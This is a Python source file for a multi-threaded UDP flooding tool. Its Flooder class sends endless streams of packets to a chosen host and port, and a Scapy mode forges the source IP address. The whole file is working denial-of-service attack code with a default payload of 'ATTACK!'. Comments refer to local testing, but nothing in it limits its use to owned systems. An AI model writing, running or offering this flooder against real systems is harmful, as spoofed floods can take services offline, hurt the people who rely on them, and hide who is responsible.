import socket
import time
import random
import threading

from typing import Literal

# Uncomment if you have scapy installed
from scapy.all import IP as scapy_IP, UDP as scapy_UDP, send as scapy_send

class Flooder():
    """
    A core UDP flooder class for sending packets.
    Designed to be imported and controlled by a/the main application.
    """

    def __init__(self, target_host: str, target_port: int, message: str = "ATTACK!", thread_count: int = 10):
        if not isinstance(target_host, str) or not target_host:
            raise ValueError("target_host must be a non-empty string.")
        if not isinstance(target_port, int) or not (0 < target_port < 65536):
            raise ValueError("target_port must be a valid port number (1-65535).")
        if not isinstance(message, str):
            raise ValueError("message must be a string.")

        self.target_host = target_host
        self.target_port = target_port
        self.thread_count = thread_count

        self._default_message = message.encode()
        self._default_spoofed_ip = "192.168.1.100"

        self.running: bool = True
        self.packets_sent = 0
        self.packet_lock = threading.Lock() # Lock for thread-safe packet counting

    def _threaded_worker(self, flood_method, packet_count: int = -1, message: bytes = None, spoofed_ip: str = None):
        """A private method to encapsulate the core flood logic for each thread."""
        try:
            flood_method(packet_count=packet_count, message=message, spoofed_ip=spoofed_ip, is_threaded=True)
        except Exception as e:
            print(f"[!] Thread error: {e}")

    def start(self, packet_count: int = -1, message: bytes = None, is_threaded: bool = False):
        """The standard (non-spoofed) flood method, now thread-aware."""
        # Use the provided message or the default one
        message_to_send = message if message is not None else self._default_message

        # Each thread gets its own socket
        current_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

        while self.running and (packet_count == -1 or self.packets_sent < packet_count):
            try:
                current_socket.sendto(message_to_send, (self.target_host, self.target_port))
                
                # Use a lock to safely increment the shared counter
                with self.packet_lock:
                    self.packets_sent += 1
                    if self.packets_sent % 1000 == 0: # 
                        print(f"[+] Sent {self.packets_sent} packets.")

                # This is for local testing so you don't kill you PC lol.
                if not is_threaded:
                    time.sleep(0.00001)

            except socket.error as e:
                print(f"[!] Socket Error sending to {self.target_host}:{self.target_port}: {e}")
                self.stop() 
                break
            except Exception as e:
                print(f"[!] General Error: {e}")
                self.stop()
                break
        
        current_socket.close() # Close the socket after the thread finishes

    def start_spoofed(self, packet_count: int = -1, message: bytes = None, spoofed_ip: str = "192.168.1.100", is_threaded: bool = False):
        """The spoofed flood method"""
        # Use the provided message or the default one
        message_to_send = message if message is not None else self._default_message

        while self.running and (packet_count == -1 or self.packets_sent < packet_count):
            # Construct the IP layer with a spoofed source IP
            s_ip = spoofed_ip if spoofed_ip is not None else self._default_spoofed_ip
            ip_layer = scapy_IP(src=s_ip, dst=self.target_host)

            # Construct the UDP layer for the target port
            udp_layer = scapy_UDP(dport=self.target_port)

            # Stack the layers and payload together to form the full packet
            packet = ip_layer / udp_layer / message_to_send

            # Send the packet over the wire
            scapy_send(packet, verbose=0)
            
            # Use a lock to safely increment the shared counter
            with self.packet_lock:
                self.packets_sent += 1
                if self.packets_sent % 1000 == 0:
                    print(f"[+] Sent {self.packets_sent} spoofed packets.")

            # Again, this is for local testing.
            if not is_threaded:
                time.sleep(0.00001)

    def start_threaded(self, flood_type: Literal["default", "spoofed"] = "default", packet_count: int = -1, message: bytes = None, spoofed_ip: str = None):
        """
        The main method to start the multi-threaded flood.
        It now waits for threads to complete if a packet_count is specified.
        """
        self.packets_sent = 0 # Reset counter for new flood

        if flood_type == "default":
            print(f"[i] Starting {self.thread_count} threads for standard UDP flood.")
            target_method = self.start
            thread_args = (packet_count, message)
        else: # flood_type == "spoofed"
            print(f"[i] Starting {self.thread_count} threads for spoofed UDP flood.")
            target_method = self.start_spoofed
            thread_args = (packet_count, message, spoofed_ip)
        
        threads = []
        try:
            for i in range(self.thread_count):
                thread = threading.Thread(target=target_method, args=thread_args)
                threads.append(thread)
                thread.start()

            # If packet_count is finite, wait for all threads to finish
            if packet_count > 0:
                for thread in threads:
                    thread.join()
                print("[i] All threads have finished their work.")
            else:
                # For infinite floods, the main thread still waits for a KeyboardInterrupt
                while self.running:
                    time.sleep(1)
                
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"[!] Error: {e}")
            self.stop()
        finally:
            # The stop method will be called either by a finite flood's completion or a KeyboardInterrupt
            if packet_count < 0: # Only call stop again if it was an infinite flood
                print("[i] Main thread finished.")


    def stop(self):
        """Stops the flooder and cleans up resources."""
        if self.running:
            self.running = False
            print(f"\n[i] Stopping flooder. Total packets sent: {self.packets_sent}")
            # Do not close socket here, each thread now manages its own